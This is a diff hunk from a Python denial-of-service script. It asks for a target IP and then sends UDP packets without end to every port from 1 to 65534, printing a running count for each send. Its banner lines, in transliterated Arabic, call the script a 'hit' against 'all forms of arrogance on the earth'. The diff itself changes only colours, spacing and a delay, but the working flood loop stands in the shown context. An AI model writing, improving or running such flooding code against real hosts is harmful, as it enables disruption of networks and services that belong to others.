@@ -51,26 +51,26 @@ faded_text = fade.fire(logo)
 print(faded_text)
 ip = input("[+] Target's IP : ")
 time.sleep(5),
-print("\033[94m          ⟩⟩  IDRIB...!!! \033[0m "),
+print("\033[94m           ⟩⟩  IDRIB...!!! \033[0m "),
 time.sleep(5),
-print("\033[96m          ⟩⟩  IS THE FI'IL AMAR \033[0m "),
+print("\033[96m           ⟩⟩  IS THE FI'IL AMAR \033[0m "),
 time.sleep(5),
-print("\033[92m          ⟩⟩  IT MEANS A HIT \033[0m "),
+print("\033[92m           ⟩⟩  IT MEANS A HIT \033[0m "),
 time.sleep(5),
-print("\033[33m          ⟩⟩  THEN THIS SC IS TO HIT \033[0m "),
+print("\033[33m           ⟩⟩  THEN THIS SC IS TO HIT \033[0m "),
 time.sleep(5),
-print("\033[35m          ⟩⟩  ALL FORMS OF ARROGANCE \033[0m "),
+print("\033[35m           ⟩⟩  ALL FORMS OF ARROGANCE \033[0m "),
 time.sleep(5),
-print("\033[97m          ⟩⟩  WHICH IS ON THE EARTH..!!! \033[0m "),
+print("\033[97m           ⟩⟩  WHICH IS ON THE EARTH..!!! \033[0m "),
 time.sleep(5),
 print("\033[33mAttack starting...\033[0m")
-time.sleep(3)
+time.sleep(5)
 while True:
     sent = 0
     for port in range(1, 65534):
         white.sendto(bytes, (ip, port))
         sent = sent + 1
-        print("\033[37mSend  \033[32m%s  \033[95m [IDRIB to]  \033[92m%s  \033[36mPort \033[33m%s " % (sent, ip, port))
-        print("\033[37mSend  \033[32m%s  [IDRIB to]  \033[92m%s  \033[36mPort \033[33m%s " % (sent, ip, port))
+        print("\033[37mSend  \033[32m%s  \033[37m [IDRIB to]  \033[92m%s  \033[36mPort \033[33m%s " % (sent, ip, port))
+        print("\033[37mSend  \033[32m%s  \033[31m [IDRIB to]  \033[92m%s  \033[36mPort \033[33m%s " % (sent, ip, port))
         
 print("\033[92mAttack finished\033[0m")
